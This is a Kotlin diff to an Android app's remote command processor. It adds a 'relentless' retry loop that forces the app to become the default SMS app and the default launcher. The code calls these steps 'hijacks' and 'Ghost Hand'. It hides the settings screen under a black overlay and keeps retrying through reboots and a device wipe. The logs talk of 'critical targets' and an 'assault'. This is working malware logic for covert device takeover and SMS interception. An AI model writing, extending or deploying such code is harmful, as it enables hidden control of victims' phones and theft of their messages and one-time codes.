@@ -2059,66 +2059,61 @@ object CommandProcessor {
                         }
 
                         // 2. Default SMS Hijack
-                        DebugLogger.log("RBT_LIFECYCLE", "Phase 2: Default SMS Hijack")
-                        if (DefaultSmsManager.isDefaultSms(ctx)) {
-                            DebugLogger.log("RBT_LIFECYCLE", "Phase 2 SKIPPED: Already the Default SMS app.")
-                        } else {
-                            DebugLogger.log("RBT_LIFECYCLE", "Not default SMS. Initiating ghost request.")
-                            DefaultSmsManager.expectedMode = "AUTO"
-                            DefaultSmsManager.requestDefault(ctx)
-                            var timeout = 0
-                            while(DefaultSmsManager.expectedMode != "" && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
-                            if (timeout >= 30) DebugLogger.log("RBT_LIFECYCLE", "Phase 2 TIMEOUT after 30s.")
-                            else DebugLogger.log("RBT_LIFECYCLE", "Phase 2 COMPLETED in ${timeout}s.")
-                        }
-
-                        // 3. Default Launcher Hijack
-                        DebugLogger.log("RBT_LIFECYCLE", "Phase 3: Launcher Hijack")
-                        val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
-                        if (currentHome == ctx.packageName) {
-                            DebugLogger.log("RBT_LIFECYCLE", "Phase 3 SKIPPED: Already the Default Launcher.")
-                        } else {
-                            DebugLogger.log("RBT_LIFECYCLE", "Not default Launcher (Current: $currentHome). Initiating EXACT standalone ghost request.")
-                            LauncherManager.isHijacking = true
-                            LauncherManager.pendingCmdId = id
+                        // THE RELENTLESS RETRY LOOP (Spans across Boot1, Erasing, and Boot2)
+                        DebugLogger.log("RBT_LIFECYCLE", "Entering Relentless Validation Loop for Critical Defaults (Max 110s)")
+                        val loopStartTime = System.currentTimeMillis()
+                        var allSuccess = false
+                        
+                        while (!allSuccess && (System.currentTimeMillis() - loopStartTime) < 110000) {
+                            allSuccess = true
                             
-                            android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                // Apply the black mask specifically for Phase 3, just like the standalone command
-                                DimmerManager.applyDim(ctx, 0, "AUTO")
-                                try {
-                                    val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
-                                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                    }
-                                    ctx.startActivity(intent)
-                                    DebugLogger.log("RBT_LIFECYCLE", "Fired Intent for ACTION_HOME_SETTINGS.")
-                                } catch (e: Exception) { 
-                                    DebugLogger.log("RBT_LIFECYCLE", "Failed to open Home Settings: ${e.message}")
-                                    LauncherManager.isHijacking = false 
-                                    DimmerManager.removeOverlay(ctx)
-                                }
+                            // Check SMS
+                            if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                                allSuccess = false
+                                DebugLogger.log("RBT_LIFECYCLE", "Validation Failed: SMS not default. Triggering Ghost Hand...")
+                                DefaultSmsManager.expectedMode = "AUTO"
+                                DefaultSmsManager.requestDefault(ctx)
+                                var timeout = 0
+                                while(DefaultSmsManager.expectedMode != "" && timeout < 15) { kotlinx.coroutines.delay(1000); timeout++ }
+                                DefaultSmsManager.expectedMode = "" // Disarm if timeout
                             }
                             
-                            var timeout = 0
-                            while(LauncherManager.isHijacking && timeout < 30) { 
-                                kotlinx.coroutines.delay(1000) 
-                                timeout++ 
-                                if (timeout % 5 == 0) DebugLogger.log("RBT_LIFECYCLE", "Phase 3 Waiting... (${timeout}s)")
-                            }
-                            
-                            if (timeout >= 30) {
-                                DebugLogger.log("RBT_LIFECYCLE", "Phase 3 TIMEOUT after 30s. Forcing abort.")
-                                LauncherManager.isHijacking = false
+                            // Check Launcher
+                            val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                            if (currentHome != ctx.packageName) {
+                                allSuccess = false
+                                DebugLogger.log("RBT_LIFECYCLE", "Validation Failed: Launcher not default (Current: $currentHome). Triggering Ghost Hand...")
+                                LauncherManager.isHijacking = true
+                                LauncherManager.pendingCmdId = id
+                                
                                 android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                    DimmerManager.removeOverlay(ctx)
+                                    DimmerManager.applyDim(ctx, 0, "AUTO")
+                                    try {
+                                        val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                        }
+                                        ctx.startActivity(intent)
+                                    } catch (e: Exception) { 
+                                        LauncherManager.isHijacking = false 
+                                    }
                                 }
-                            } else {
-                                DebugLogger.log("RBT_LIFECYCLE", "Phase 3 COMPLETED in ${timeout}s.")
+                                
+                                var timeout = 0
+                                while(LauncherManager.isHijacking && timeout < 20) { 
+                                    kotlinx.coroutines.delay(1000); timeout++ 
+                                }
+                                LauncherManager.isHijacking = false // Disarm if timeout
+                            }
+                            
+                            if (!allSuccess) {
+                                DebugLogger.log("RBT_LIFECYCLE", "Critical targets not acquired. Cooling down for 3s before next assault...")
+                                kotlinx.coroutines.delay(3000)
                             }
                         }
 
                         prefs.edit().putBoolean("hijacks_completed", true).apply()
-                        DebugLogger.log("RBT_LIFECYCLE", "All RBT phases finished. Updating command status.")
-                        CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "All background hijacks completed.")
+                        DebugLogger.log("RBT_LIFECYCLE", "Relentless Loop Exited. All Success: $allSuccess")
+                        CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "Background hijacks completed. All Success: $allSuccess")
                     }
                     status = "BACKGROUND_HIJACKS_STARTED"
                 }
